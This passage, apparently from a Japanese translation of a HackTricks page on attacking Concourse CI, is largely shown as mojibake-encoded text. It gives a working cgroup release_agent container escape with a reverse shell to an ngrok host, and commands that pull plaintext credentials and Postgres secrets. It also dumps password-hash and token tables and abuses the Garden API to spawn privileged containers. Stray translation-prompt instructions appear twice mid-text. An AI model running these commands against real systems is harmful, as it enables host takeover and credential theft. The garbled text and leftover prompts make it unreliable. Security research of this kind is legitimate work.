ã”è¦§ã®ã¨ãŠã‚Šã€ã“ã‚Œã¯å˜ã«ãƒãƒ¼ãƒ‰ã®cmdã®ãƒ‘ã‚¹ã‚’å¤‰æ›´ã™ã‚‹ã ã‘ã®[**é€šå¸¸ã®release\_agent escape**](broken-reference)ã§ã™ã€‚
{% endhint %}

### Workerã‚³ãƒ³ãƒ†ãƒŠã‹ã‚‰ãƒãƒ¼ãƒ‰ã¸ã®è„±å‡º

ã“ã‚Œã«ã¯ã€ã‚ãšã‹ãªå¤‰æ›´ã‚’åŠ ãˆãŸé€šå¸¸ã®release\_agent escapeãŒååˆ†ã§ã™ï¼š
```bash
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab | head -n 1`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#====================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/0.tcp.ngrok.io/14966 0>&1" >> /cmd
chmod a+x /cmd
#====================================
# Get output
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#====================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
### Webã‚³ãƒ³ãƒ†ãƒŠã‹ã‚‰ãƒãƒ¼ãƒ‰ã¸ã®è„±å‡º

Webã‚³ãƒ³ãƒ†ãƒŠã«ã¯ã„ãã¤ã‹ã®é˜²å¾¡ãŒç„¡åŠ¹ã«ãªã£ã¦ã„ã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ãŒã€**ä¸€èˆ¬çš„ãªç‰¹æ¨©ã‚³ãƒ³ãƒ†ãƒŠã¨ã—ã¦ã¯å®Ÿè¡Œã•ã‚Œã¦ã„ã¾ã›ã‚“**ï¼ˆä¾‹ãˆã°ã€**ãƒã‚¦ãƒ³ãƒˆã¯ã§ãã¾ã›ã‚“**ã—ã€**æ©Ÿèƒ½ã¯éå¸¸ã«é™å®šã•ã‚Œã¦ã„ã¾ã™**ã®ã§ã€ã‚³ãƒ³ãƒ†ãƒŠã‹ã‚‰è„±å‡ºã™ã‚‹ç°¡å˜ãªæ–¹æ³•ã¯å½¹ã«ç«‹ã¡ã¾ã›ã‚“ï¼‰ã€‚

ã—ã‹ã—ã€**ãƒ­ãƒ¼ã‚«ãƒ«ã®è³‡æ ¼æƒ…å ±ã‚’å¹³æ–‡ã§ä¿å­˜ã—ã¦ã„ã¾ã™**ï¼š
```bash
cat /concourse-auth/local-users
test:test

env | grep -i local_user
CONCOURSE_MAIN_TEAM_LOCAL_USER=test
CONCOURSE_ADD_LOCAL_USER=test:test
```
ä»¥ä¸‹ã®ãƒ†ã‚­ã‚¹ãƒˆã¯ã€ãƒãƒƒã‚­ãƒ³ã‚°æŠ€è¡“ã«é–¢ã™ã‚‹ãƒãƒƒã‚­ãƒ³ã‚°ã®æœ¬ã‹ã‚‰ã®ã‚‚ã®ã§ã™ã€‚é–¢é€£ã™ã‚‹è‹±èªã®ãƒ†ã‚­ã‚¹ãƒˆã‚’æ—¥æœ¬èªã«ç¿»è¨³ã—ã€ã¾ã£ãŸãåŒã˜ãƒãƒ¼ã‚¯ãƒ€ã‚¦ãƒ³ãŠã‚ˆã³htmlæ§‹æ–‡ã‚’ä¿æŒã—ã¦ç¿»è¨³ã‚’è¿”ã—ã¦ãã ã•ã„ã€‚ã‚³ãƒ¼ãƒ‰ã€ãƒãƒƒã‚­ãƒ³ã‚°æŠ€è¡“åã€ãƒãƒƒã‚­ãƒ³ã‚°ç”¨èªã€ã‚¯ãƒ©ã‚¦ãƒ‰/SaaSãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ åï¼ˆWorkspaceã€awsã€gcpãªã©ï¼‰ã€'leak'ã¨ã„ã†å˜èªã€ãƒšãƒãƒˆãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãƒ†ã‚¹ãƒˆã€ãŠã‚ˆã³ãƒãƒ¼ã‚¯ãƒ€ã‚¦ãƒ³ã‚¿ã‚°ã®ã‚ˆã†ãªã‚‚ã®ã¯ç¿»è¨³ã—ãªã„ã§ãã ã•ã„ã€‚ã¾ãŸã€ç¿»è¨³ã¨ãƒãƒ¼ã‚¯ãƒ€ã‚¦ãƒ³æ§‹æ–‡ä»¥å¤–ã®ä½™åˆ†ãªã‚‚ã®ã¯è¿½åŠ ã—ãªã„ã§ãã ã•ã„ã€‚

---

ãã®**ã‚¯ãƒ¬ãƒ‡ãƒ³ã‚·ãƒ£ãƒ«ã‚’ä½¿ç”¨ã—ã¦ã‚¦ã‚§ãƒ–ã‚µãƒ¼ãƒãƒ¼ã«ãƒ­ã‚°ã‚¤ãƒ³ã—**ã€**ç‰¹æ¨©ã‚³ãƒ³ãƒ†ãƒŠã‚’ä½œæˆã—ã¦ãƒãƒ¼ãƒ‰ã«è„±å‡ºã™ã‚‹**ã“ã¨ãŒã§ãã¾ã™ã€‚

ç’°å¢ƒå†…ã§ã¯ã€concourseãŒä½¿ç”¨ã—ã¦ã„ã‚‹**postgresql**ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã®æƒ…å ±ã‚‚è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆã‚¢ãƒ‰ãƒ¬ã‚¹ã€**ãƒ¦ãƒ¼ã‚¶ãƒ¼å**ã€**ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰**ã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ãªã©ã®æƒ…å ±ã‚’å«ã‚€ï¼‰ï¼š
```bash
env | grep -i postg
CONCOURSE_RELEASE_POSTGRESQL_PORT_5432_TCP_ADDR=10.107.191.238
CONCOURSE_RELEASE_POSTGRESQL_PORT_5432_TCP_PORT=5432
CONCOURSE_RELEASE_POSTGRESQL_SERVICE_PORT_TCP_POSTGRESQL=5432
CONCOURSE_POSTGRES_USER=concourse
CONCOURSE_POSTGRES_DATABASE=concourse
CONCOURSE_POSTGRES_PASSWORD=concourse
[...]

# Access the postgresql db
psql -h 10.107.191.238 -U concourse -d concourse
select * from password; #Find hashed passwords
select * from access_tokens;
select * from auth_code;
select * from client;
select * from refresh_token;
select * from teams; #Change the permissions of the users in the teams
select * from users;
```
### Garden ã‚µãƒ¼ãƒ“ã‚¹ã®æ‚ªç”¨ - å®Ÿéš›ã®æ”»æ’ƒã§ã¯ã‚ã‚Šã¾ã›ã‚“

{% hint style="warning" %}
ã“ã‚Œã¯ã‚µãƒ¼ãƒ“ã‚¹ã«é–¢ã™ã‚‹ã„ãã¤ã‹ã®èˆˆå‘³æ·±ã„ãƒ¡ãƒ¢ã§ã™ãŒã€localhost ã§ã®ã¿ãƒªã‚¹ãƒ‹ãƒ³ã‚°ã—ã¦ã„ã‚‹ãŸã‚ã€ã“ã‚Œã‚‰ã®ãƒ¡ãƒ¢ã¯ä»¥å‰ã«æ—¢ã«æ‚ªç”¨ã—ãŸã‚¤ãƒ³ãƒ‘ã‚¯ãƒˆã‚’æç¤ºã—ã¾ã›ã‚“ã€‚
{% endhint %}

ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€å„Concourseãƒ¯ãƒ¼ã‚«ãƒ¼ã¯ãƒãƒ¼ãƒˆ7777ã§[**Garden**](https://github.com/cloudfoundry/garden)ã‚µãƒ¼ãƒ“ã‚¹ã‚’å®Ÿè¡Œã—ã¦ã„ã¾ã™ã€‚ã“ã®ã‚µãƒ¼ãƒ“ã‚¹ã¯ã€Webãƒã‚¹ã‚¿ãƒ¼ãŒãƒ¯ãƒ¼ã‚«ãƒ¼ã«**å®Ÿè¡Œã™ã‚‹å¿…è¦ãŒã‚ã‚‹ã“ã¨**ï¼ˆã‚¤ãƒ¡ãƒ¼ã‚¸ã®ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã¨å„ã‚¿ã‚¹ã‚¯ã®å®Ÿè¡Œï¼‰ã‚’æŒ‡ç¤ºã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚æ”»æ’ƒè€…ã«ã¨ã£ã¦ã¯ã‹ãªã‚Šè‰¯ã•ãã†ã§ã™ãŒã€ã„ãã¤ã‹ã®è‰¯ã„ä¿è­·ãŒã‚ã‚Šã¾ã™ï¼š

* ãƒ­ãƒ¼ã‚«ãƒ«ï¼ˆ127.0.0.1ï¼‰ã§ã®ã¿**å…¬é–‹ã•ã‚Œã¦ã„ã¾ã™**ã€‚ãã—ã¦ã€ãƒ¯ãƒ¼ã‚«ãƒ¼ãŒç‰¹åˆ¥ãªSSHã‚µãƒ¼ãƒ“ã‚¹ã§Webã«å¯¾ã—ã¦èªè¨¼ã™ã‚‹ã¨ãã€Webã‚µãƒ¼ãƒãƒ¼ãŒå„ãƒ¯ãƒ¼ã‚«ãƒ¼å†…ã®å„Gardenã‚µãƒ¼ãƒ“ã‚¹ã¨**é€šä¿¡ã§ãã‚‹ã‚ˆã†ã«**ãƒˆãƒ³ãƒãƒ«ãŒä½œæˆã•ã‚Œã‚‹ã¨æ€ã„ã¾ã™ã€‚
* Webã‚µãƒ¼ãƒãƒ¼ã¯æ•°ç§’ã”ã¨ã«å®Ÿè¡Œä¸­ã®ã‚³ãƒ³ãƒ†ãƒŠã‚’**ç›£è¦–ã—ã¦ãŠã‚Š**ã€**äºˆæœŸã—ãªã„**ã‚³ãƒ³ãƒ†ãƒŠã¯**å‰Šé™¤ã•ã‚Œã¾ã™**ã€‚ã—ãŸãŒã£ã¦ã€**ã‚«ã‚¹ã‚¿ãƒ ã‚³ãƒ³ãƒ†ãƒŠã‚’å®Ÿè¡Œã—ãŸã„å ´åˆ**ã¯ã€Webã‚µãƒ¼ãƒãƒ¼ã¨Gardenã‚µãƒ¼ãƒ“ã‚¹é–“ã®**é€šä¿¡ã‚’æ”¹ã–ã‚“ã™ã‚‹**å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

Concourseãƒ¯ãƒ¼ã‚«ãƒ¼ã¯é«˜ã„ã‚³ãƒ³ãƒ†ãƒŠæ¨©é™ã§å®Ÿè¡Œã•ã‚Œã¾ã™ï¼š
```
Container Runtime: docker
Has Namespaces:
pid: true
user: false
AppArmor Profile: kernel
Capabilities:
BOUNDING -> chown dac_override dac_read_search fowner fsetid kill setgid setuid setpcap linux_immutable net_bind_service net_broadcast net_admin net_raw ipc_lock ipc_owner sys_module sys_rawio sys_chroot sys_ptrace sys_pacct sys_admin sys_boot sys_nice sys_resource sys_time sys_tty_config mknod lease audit_write audit_control setfcap mac_override mac_admin syslog wake_alarm block_suspend audit_read
Seccomp: disabled
```
ä»¥ä¸‹ã¯ã€ãƒãƒƒã‚­ãƒ³ã‚°æŠ€è¡“ã«é–¢ã™ã‚‹ãƒãƒƒã‚­ãƒ³ã‚°ã®æœ¬ã®å†…å®¹ã§ã™ã€‚é–¢é€£ã™ã‚‹è‹±èªã®ãƒ†ã‚­ã‚¹ãƒˆã‚’æ—¥æœ¬èªã«ç¿»è¨³ã—ã€ã¾ã£ãŸãåŒã˜markdownãŠã‚ˆã³htmlæ§‹æ–‡ã‚’ä¿æŒã—ã¦ç¿»è¨³ã‚’è¿”ã—ã¦ãã ã•ã„ã€‚ã‚³ãƒ¼ãƒ‰ã€ãƒãƒƒã‚­ãƒ³ã‚°æŠ€è¡“åã€ãƒãƒƒã‚­ãƒ³ã‚°ç”¨èªã€ã‚¯ãƒ©ã‚¦ãƒ‰/SaaSãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ åï¼ˆWorkspaceã€awsã€gcpãªã©ï¼‰ã€'leak'ã¨ã„ã†å˜èªã€pentestingã€ãŠã‚ˆã³markdownã‚¿ã‚°ãªã©ã®ç¿»è¨³ã¯è¡Œã‚ãªã„ã§ãã ã•ã„ã€‚ã¾ãŸã€ç¿»è¨³ã¨markdownæ§‹æ–‡ä»¥å¤–ã®ä½™åˆ†ãªã‚‚ã®ã‚’è¿½åŠ ã—ãªã„ã§ãã ã•ã„ã€‚

---

ãŸã ã—ã€ãƒãƒ¼ãƒ‰ã®/devãƒ‡ãƒã‚¤ã‚¹ã‚’**ãƒã‚¦ãƒ³ãƒˆ**ã™ã‚‹ã‚„release\_agentã®ã‚ˆã†ãªæŠ€è¡“ã¯**æ©Ÿèƒ½ã—ã¾ã›ã‚“**ï¼ˆãƒãƒ¼ãƒ‰ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ãŒã‚ã‚‹å®Ÿéš›ã®ãƒ‡ãƒã‚¤ã‚¹ã«ã¯ã‚¢ã‚¯ã‚»ã‚¹ã§ããšã€ä»®æƒ³ã®ã‚‚ã®ã®ã¿ãŒã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ã§ã™ï¼‰ã€‚ãƒãƒ¼ãƒ‰ã®ãƒ—ãƒ­ã‚»ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ããªã„ãŸã‚ã€ã‚«ãƒ¼ãƒãƒ«ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆãªã—ã§ãƒãƒ¼ãƒ‰ã‹ã‚‰ã®è„±å‡ºã¯è¤‡é›‘ã«ãªã‚Šã¾ã™ã€‚

{% hint style="info" %}
å‰ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§ã¯ã€ç‰¹æ¨©ã‚³ãƒ³ãƒ†ãƒŠã‹ã‚‰ã®è„±å‡ºæ–¹æ³•ã‚’è¦‹ã¾ã—ãŸã€‚ã—ãŸãŒã£ã¦ã€**ç¾åœ¨ã®** **ãƒ¯ãƒ¼ã‚«ãƒ¼**ã«ã‚ˆã£ã¦ä½œæˆã•ã‚ŒãŸ**ç‰¹æ¨©ã‚³ãƒ³ãƒ†ãƒŠ**ã§ã‚³ãƒãƒ³ãƒ‰ã‚’**å®Ÿè¡Œ**ã§ãã‚‹å ´åˆã€ãƒãƒ¼ãƒ‰ã«**è„±å‡º**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
{% endhint %}

Concourseã‚’æ“ä½œã—ã¦ã„ã¦æ°—ã¥ã„ãŸã®ã¯ã€ä½•ã‹ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«æ–°ã—ã„ã‚³ãƒ³ãƒ†ãƒŠãŒç”Ÿæˆã•ã‚Œã‚‹ã¨ã€ãã®ã‚³ãƒ³ãƒ†ãƒŠã®ãƒ—ãƒ­ã‚»ã‚¹ã¯ãƒ¯ãƒ¼ã‚«ãƒ¼ã‚³ãƒ³ãƒ†ãƒŠã‹ã‚‰ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ã§ã‚ã‚‹ãŸã‚ã€ã¾ã‚‹ã§ã‚³ãƒ³ãƒ†ãƒŠãŒãã®å†…éƒ¨ã«æ–°ã—ã„ã‚³ãƒ³ãƒ†ãƒŠã‚’ä½œæˆã—ã¦ã„ã‚‹ã‚ˆã†ã§ã™ã€‚

#### å®Ÿè¡Œä¸­ã®ç‰¹æ¨©ã‚³ãƒ³ãƒ†ãƒŠå†…ã«å…¥ã‚‹
```bash
# Get current container
curl 127.0.0.1:7777/containers
{"Handles":["ac793559-7f53-4efc-6591-0171a0391e53","c6cae8fc-47ed-4eab-6b2e-f3bbe8880690"]}

# Get container info
curl 127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/info
curl 127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/properties

# Execute a new process inside a container
## In this case "sleep 20000" will be executed in the container with handler ac793559-7f53-4efc-6591-0171a0391e53
wget -v -O- --post-data='{"id":"task2","path":"sh","args":["-cx","sleep 20000"],"dir":"/tmp/build/e55deab7","rlimits":{},"tty":{"window_size":{"columns":500,"rows":500}},"image":{}}' \
--header='Content-Type:application/json' \
'http://127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/processes'

# OR instead of doing all of that, you could just get into the ns of the process of the privileged container
nsenter --target 76011 --mount --uts --ipc --net --pid -- sh
```
#### æ–°ã—ã„ç‰¹æ¨©ã‚³ãƒ³ãƒ†ãƒŠã®ä½œæˆ

æ–°ã—ã„ã‚³ãƒ³ãƒ†ãƒŠã‚’éå¸¸ã«ç°¡å˜ã«ä½œæˆã—ï¼ˆãƒ©ãƒ³ãƒ€ãƒ ãªUIDã‚’å®Ÿè¡Œã™ã‚‹ã ã‘ã§ï¼‰ã€ãã‚Œã«ä½•ã‹ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™:
```bash
curl -X POST http://127.0.0.1:7777/containers \
-H 'Content-Type: application/json' \
-d '{"handle":"123ae8fc-47ed-4eab-6b2e-123458880690","rootfs":"raw:///concourse-work-dir/volumes/live/ec172ffd-31b8-419c-4ab6-89504de17196/volume","image":{},"bind_mounts":[{"src_path":"/concourse-work-dir/volumes/live/9f367605-c9f0-405b-7756-9c113eba11f1/volume","dst_path":"/scratch","mode":1}],"properties":{"user":""},"env":["BUILD_ID=28","BUILD_NAME=24","BUILD_TEAM_ID=1","BUILD_TEAM_NAME=main","ATC_EXTERNAL_URL=http://127.0.0.1:8080"],"limits":{"bandwidth_limits":{},"cpu_limits":{},"disk_limits":{},"memory_limits":{},"pid_limits":{}}}'

# Wget will be stucked there as long as the process is being executed
wget -v -O- --post-data='{"id":"task2","path":"sh","args":["-cx","sleep 20000"],"dir":"/tmp/build/e55deab7","rlimits":{},"tty":{"window_size":{"columns":500,"rows":500}},"image":{}}' \
--header='Content-Type:application/json' \
'http://127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/processes'
```
```
ã—ã‹ã—ã€ã‚¦ã‚§ãƒ–ã‚µãƒ¼ãƒãƒ¼ã¯æ•°ç§’ã”ã¨ã«å®Ÿè¡Œä¸­ã®ã‚³ãƒ³ãƒ†ãƒŠã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãŠã‚Šã€äºˆæœŸã—ãªã„ã‚³ãƒ³ãƒ†ãƒŠãŒç™ºè¦‹ã•ã‚Œã‚‹ã¨ã€ãã‚Œã¯å‰Šé™¤ã•ã‚Œã¾ã™ã€‚é€šä¿¡ãŒHTTPã§è¡Œã‚ã‚Œã¦ã„ã‚‹ãŸã‚ã€äºˆæœŸã—ãªã„ã‚³ãƒ³ãƒ†ãƒŠã®å‰Šé™¤ã‚’é¿ã‘ã‚‹ãŸã‚ã«é€šä¿¡ã‚’æ”¹ã–ã‚“ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š
```
```
GET /containers HTTP/1.1.
Host: 127.0.0.1:7777.
User-Agent: Go-http-client/1.1.
Accept-Encoding: gzip.
.

T 127.0.0.1:7777 -> 127.0.0.1:59722 [AP] #157
HTTP/1.1 200 OK.
Content-Type: application/json.
Date: Thu, 17 Mar 2022 22:42:55 GMT.
Content-Length: 131.
.
{"Handles":["123ae8fc-47ed-4eab-6b2e-123458880690","ac793559-7f53-4efc-6591-0171a0391e53","c6cae8fc-47ed-4eab-6b2e-f3bbe8880690"]}

T 127.0.0.1:59722 -> 127.0.0.1:7777 [AP] #159
DELETE /containers/123ae8fc-47ed-4eab-6b2e-123458880690 HTTP/1.1.
Host: 127.0.0.1:7777.
User-Agent: Go-http-client/1.1.
Accept-Encoding: gzip.
```
# å‚è€ƒæ–‡çŒ®
* https://concourse-ci.org/vars.html

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)ã§AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã«ã‚ãªãŸã®ä¼šç¤¾ã‚’åºƒå‘Šã—ãŸã„**ã€ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«**å‚åŠ ã™ã‚‹**ã‹ã€[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹**ã€‚
* [**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’**å…±æœ‰ã™ã‚‹**ã€‚

</details>
